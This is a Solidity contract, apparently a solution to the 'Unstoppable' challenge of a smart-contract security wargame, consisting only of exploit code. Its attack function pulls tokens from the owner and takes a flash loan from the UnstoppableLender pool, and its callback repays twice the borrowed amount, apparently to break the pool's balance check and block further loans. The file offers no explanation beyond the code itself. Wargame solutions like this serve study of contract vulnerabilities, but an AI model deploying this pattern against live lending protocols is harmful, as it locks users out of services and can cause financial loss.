pragma solidity ^0.6.0;

import "../unstoppable/UnstoppableLender.sol";
import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackUnstoppableLender {

    using SafeMath for uint256;

    UnstoppableLender private pool;
    address private owner;

    modifier onlyPool() {
        require(msg.sender == address(pool));
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address poolAddress) public {
        pool = UnstoppableLender(poolAddress);
        owner = msg.sender;
    }

    function receiveTokens(address tokenAddress, uint256 amount) external onlyPool {
        require(IERC20(tokenAddress).transfer(msg.sender, amount.mul(2)));
    }

    function attack(address tokenAddress, uint256 amount) external onlyOwner {
        require(IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount));
        pool.flashLoan(amount);
    }
}